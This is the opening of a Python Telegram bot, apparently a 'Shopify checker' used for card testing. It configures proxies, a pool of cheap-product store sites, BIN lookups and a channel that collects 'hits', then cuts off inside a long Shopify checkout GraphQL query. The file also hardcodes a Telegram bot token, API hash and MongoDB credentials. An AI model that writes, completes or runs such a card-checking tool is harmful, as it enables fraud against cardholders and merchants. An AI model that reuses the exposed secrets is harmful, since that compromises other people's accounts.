import asyncio
import aiohttp
import json
import re
import random
import argparse
from urllib.parse import urlparse
from pyrogram import Client, filters, types
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from pyrogram.enums import ParseMode
import os
import time
from datetime import datetime, timedelta
import threading
from queue import Queue, Empty
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
from typing import Optional, Dict, List, Tuple, Any
import hashlib
import aiofiles
from motor.motor_asyncio import AsyncIOMotorClient
from pymongo import MongoClient
from bson import ObjectId
from collections import defaultdict


import nest_asyncio
nest_asyncio.apply()

# Configuration
BOT_TOKEN = "8435065448:AAF3deY52T_TRETXKPgZnqOaqyfHXzUVlZ4"
API_ID = 23933044
API_HASH = "6df11147cbec7d62a323f0f498c8c03a"
ADMINS = [7125341830]
MONGO_URL = "mongodb+srv://animepahe:animepahe@animepahe.o8zgy.mongodb.net/?retryWrites=true&w=majority"
HIT_CHANNEL = -1003805693108  # Channel for forwarding hits

# Constants
MAX_SITES_PER_USER = 500
MAX_GLOBAL_SITES = 500
MAX_SITE_PRODUCT_PRICE = 20.00
WORKER_COUNT = int(os.getenv("WORKER_COUNT", "30"))
PROXY_VALIDATION_URL = "https://httpbin.org/ip"
PROXY_VALIDATION_TIMEOUT = 6
PROXY_VALIDATION_CONCURRENCY = 25
PRODUCT_CACHE_TTL_SECONDS = 300
BIN_CACHE_TTL_SECONDS = 86400

# Logging setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Initialize bot
app = Client(
    "shopify_checker_bot",
    bot_token=BOT_TOKEN,
    api_id=API_ID,
    api_hash=API_HASH
)

# MongoDB connection
client = AsyncIOMotorClient(MONGO_URL)
db = client['shopify_bot']
users_col = db['users']
proxies_col = db['proxies']
sites_col = db['sites']
user_sites_col = db['user_sites']

# In-memory task tracking (instead of database)
active_tasks = {}  # task_id -> task info
task_stats = {}    # message_id -> task stats
task_messages = {} # message_id -> message object
task_users = {}    # message_id -> user_id
product_cache = {} # normalized_site -> {"data": product_info, "expires_at": epoch}
bin_cache = {}     # bin -> {"data": bin_info, "expires_at": epoch}

# Global queues
TASK_QUEUE = asyncio.Queue()
RESULT_QUEUE = asyncio.Queue()
active_workers = []

# Placeholders for GraphQL queries (to be added manually)
# QUERY_PROPOSAL_SHIPPING
QUERY_PROPOSAL_SHIPPING = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on 